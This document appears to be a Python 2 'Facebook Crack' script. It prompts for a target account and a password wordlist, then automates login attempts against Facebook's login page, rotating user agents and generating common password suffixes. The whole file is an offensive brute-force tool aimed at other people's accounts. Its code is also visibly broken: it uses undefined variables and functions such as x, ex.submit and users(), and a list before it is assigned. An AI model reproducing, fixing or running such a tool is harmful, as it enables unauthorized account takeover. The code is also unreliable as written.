#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import sys
import cookielib
import random
import mechanize
import os


email = []
id = []
pw = []


##### LOGO #####
logo = """\033[1;93m_/﹋\_          
\033[1;34m(🌀🌀)\033[0m
\033[1;36m<,︻╦╤─ ҉ ------------\033[0m \033[1;93m*Crack Facebook*\033[0m
\033[1;36m_/﹋\_\033[0m
\033[1;31m╔════════════════════════════════════════╗
\033[1;31m║ \033[1;93m*Author :\033[0m \033[1;97mUPIL FACEBOOK \033[0m               \033[1;31m║
\033[1;31m║ \033[1;93m*Github :\033[0m \033[1;34mhttps://github.com/aryhas\033[0m    \033[1;31m║
\033[1;31m╚════════════════════════════════════════╝\033[0m"""


os.system('clear')
print logo
print
print 42*"\033[1;96m="
email = str(raw_input("\033[1;96m[+] \033[1;93mUsername/Email/No HP target \033[1;97m: "))

passwordlist = str(raw_input("\033[1;96m[+] \033[1;93mWordlist \033[1;97m: "))


login = 'https://www.facebook.com/login.php?login_attempt=1'


useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
	global br
	br = mechanize.Browser()
	cj = cookielib.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	welcome()
	search()
	print("\033[1;97mPassword does not exist in the wordlist")

	
	
def brute(password):
	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(useragents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n\n\033[1;96m[+] Password Find = {}".format(password))
			raw_input("\033[1;31mkeluar....")
			sys.exit(1)

			
def search():
	global password
	passwords = open(listpass,"r")
	for password in passwords:
		listpass = [
			str(x) + '123',
			str(x) + '786',
			str(x) + '12345',
			str(x) + '@123',
			str(x) + '12',
			str(x) + '123456',
  			str(x) + '1234',
			str(x) + '121',
			str(x) + '001',
			str(x) + '111',
			str(x) + '2020',
			str(x) + '10',
			str(x)
			]
		listpass.append(passwordlist)
 		for passw in set(listpass):
			ex.submit(login,(users(1)),(passw))

		
#welcome 
def welcome():
	wel = """+=========================================+
|..........   Facebook Crack   ...........|
+-----------------------------------------+
|            #Author: UPIL FACEBOOK              | 
|	       Version 1.0                |
|   https://github.com/aryhas             |
+=========================================+
|..........  Facebook Cracker  ...........|
+-----------------------------------------+\n\n
"""
	print wel 
	print " [*] Account to crack : {}".format(email)
	print " [*] Loaded :" , len(passwords)
	print " [*] Cracking, please wait ...\n\n"

	
if __name__ == '__main__':
	main()
